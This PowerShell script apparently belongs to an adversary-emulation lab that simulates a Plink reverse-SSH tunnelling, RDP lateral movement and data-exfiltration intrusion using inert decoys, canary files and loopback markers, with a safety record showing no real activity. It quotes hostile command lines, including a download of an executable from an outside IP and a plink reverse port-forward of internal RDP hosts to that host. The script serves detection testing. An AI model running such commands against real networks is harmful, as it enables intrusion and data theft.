#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\MsiPlinkSim-utilities.ps1"
Assert-MsiPlinkSafety -LabConfirmed:$LabConfirmed
$p = Initialize-MsiPlinkEnvironment

$plink = Join-Path $p.Payloads 'ekern.exe'
New-MsiPlinkDecoy $plink 'renamed Plink reverse-SSH stand-in' '828e81aa16b2851561fff6d3127663ea2d1d68571f06cbd732fdf5672086924d'
Write-MsiPlinkFile (Join-Path $p.Temp 'FXS.bat') '@REM INERT PLINK/RDP-TUNNEL CANARY. Published credentials are intentionally omitted and no tunnel is created.' 'tunnel batch canary'
Invoke-MsiPlinkDecoy $plink 'PowerShell WebClient.DownloadFile hXXp://23.81.246.84/file.exe -> C:\Windows\Temp\ekern.exe' 'fm2.jsp/java.exe'
$targets = @('127.0.0.1:3389 beachhead','10.X.X.10:3389 domain controller','10.X.X.20:3389 file server','10.X.X.30:3389 additional server')
foreach ($target in $targets) { Invoke-MsiPlinkDecoy $plink "echo y | ekern.exe -ssh -P 443 -l admin1 -pw [REDACTED] -R 23.81.246.84:49800:$target 23.81.246.84" 'FXS.bat'; Invoke-MsiPlinkLoopback 443 "23.81.246.84 Bitvise SSH reverse forwarding to $target" 'SSH marker' }
foreach ($port in @(3389,445)) { Invoke-MsiPlinkLoopback $port "RDP/SMB movement among generated beachhead, DC, file server, and third server; port $port" 'lateral marker' }

Write-MsiPlinkFile (Join-Path $p.Collection 'SupportCenterPlus-postgres-backup.backup') 'GENERATED DATABASE BACKUP CANARY. Contains no application or organizational data.' 'collection canary'
Write-MsiPlinkFile (Join-Path $p.Collection 'server-certificate.pfx') 'GENERATED CERTIFICATE-NAME CANARY. Contains no certificate, key, or secret.' 'certificate canary'
Write-MsiPlinkFile (Join-Path $p.Collection 'Partner-Network.vsdx') 'GENERATED VISIO-NAME CANARY. Contains no organizational data.' 'document canary'
Write-MsiPlinkFile (Join-Path $p.Collection 'Accounts.xlsx') 'GENERATED SPREADSHEET-NAME CANARY. Contains no account or organizational data.' 'document canary'
Write-MsiPlinkFile (Join-Path $p.Collection 'Selected-Critical-Partner-Documents.zip') 'GENERATED SELECTIVE-COLLECTION CANARY. Not an archive and contains no partner data.' 'document canary'
foreach ($target in @('fm2.jsp file download to web-shell query IP','RDP clipboard/file transfer','canary token alert 8.0.26.137','canary token alert 192.221.154.141')) { Invoke-MsiPlinkLoopback 443 $target 'collection/exfiltration marker' }
Write-MsiPlinkFile (Join-Path $p.Evidence 'plink-rdp-exfil-negative-record.json') (@{payloadsDownloaded=0;SSHConnections=0;tunnelsCreated=0;credentialsUsed=$false;RDPSessions=0;remoteHostsTouched=0;domainControllersTouched=0;sharesAccessed=0;realFilesRead=0;realCertificatesRead=0;archivesCreated=0;webShellDownloads=0;clipboardTransfers=0;canaryTokensTriggered=0;bytesTransferred=0;impactActions=0} | ConvertTo-Json) 'phase safety record'
Add-MsiPlinkTimeline 176 command-and-control 'Day-eight ekern/Plink download and Bitvise SSH-over-443 reverse RDP forwarding represented' @{downloads=0;tunnelsCreated=0;technique='T1572'}
Add-MsiPlinkTimeline 180 lateral-movement 'RDP to beachhead, domain controller, file server, and third server with harvested domain account represented' @{RDPSessions=0;remoteHostsTouched=0;techniques=@('T1021.001','T1078.002')}
Add-MsiPlinkTimeline 190 exfiltration 'Selective database, certificate, Visio, accounts spreadsheet, and critical partner document theft via web shell and RDP represented' @{realFilesRead=0;bytesTransferred=0}
Add-MsiPlinkTimeline 192 conclusion 'Evicted shortly after confidential-information theft' @{impactActions=0;actualTheft=$false}
